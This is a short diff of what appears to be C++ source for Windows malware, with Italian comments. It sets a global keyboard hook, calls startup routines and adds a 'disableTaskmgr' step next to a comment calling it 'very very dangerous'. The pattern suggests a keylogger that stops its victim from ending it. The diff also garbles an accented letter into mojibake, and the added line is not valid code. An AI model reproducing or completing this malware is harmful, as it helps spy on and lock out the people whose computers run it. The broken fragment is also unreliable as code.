@@ -8,7 +8,7 @@
 using namespace std;
 
 
-//questo programma è facilmente individuabile dagli antivirus :)
+//questo programma Ã¨ facilmente individuabile dagli antivirus :)
 
 HHOOK _hook;
 
@@ -189,7 +189,7 @@ richiesta();
 	SetHook();
 	avvio();
 	
-	//molto molto pericolosa
+	disableTaskmgr//molto molto pericolosa
 
 	// loop 
 	MSG msg;
